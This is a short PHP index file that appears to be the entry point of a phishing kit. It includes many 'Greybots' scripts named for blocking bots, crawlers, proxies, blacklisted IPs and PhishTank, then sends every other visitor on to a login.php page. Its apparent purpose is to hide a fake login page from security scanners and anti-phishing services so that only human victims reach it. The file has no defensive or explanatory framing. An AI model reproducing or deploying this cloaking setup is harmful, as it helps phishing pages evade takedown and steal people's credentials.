<?php
     include "block/block.php";
 	include "Greybots/Bad_ip.php";
	include "Greybots/Grey-Bot-1.php";
	include "Greybots/Grey-Bot-2.php";
	include "Greybots/Grey-Bot-3.php";
	include "Greybots/Grey-Bot-4.php";
	include "Greybots/Grey-Bot-5.php";
	include "Greybots/Grey-Bot-6.php";
	include "Greybots/Grey-Bot-7.php";
	include "Greybots/Grey-Bot-8.php";
	include "Greybots/Grey-Bot-9.php";
	include "Greybots/Grey-Bot-10.php";
	include "Greybots/Grey-Bot-11.php";
	include "Greybots/Grey-Bot-12.php";
	include "Greybots/Grey-Bot-Crawler.php";
	include "Greybots/Grey-IP-BlackList.php";
	include "Greybots/Grey-Phishingtank.php";
	include "Greybots/Grey-antibot-phishtank.php";
	include "Greybots/Grey-Proxyblock.php";
	include "Greybots/Grey-userAgent-1.php";
	include "Greybots/Grey-userAgent-2.php";
	include "Greybots/Grey-antibot-host.php";
	include "Greybots/Grey-antibot-ip.php";
	include "Greybots/Grey-antibot-proxy.php";
	include "Greybots/Grey-Blocker.php";
	include "Greybots/Grey-Bot.php";

header("Location: login.php");


?>
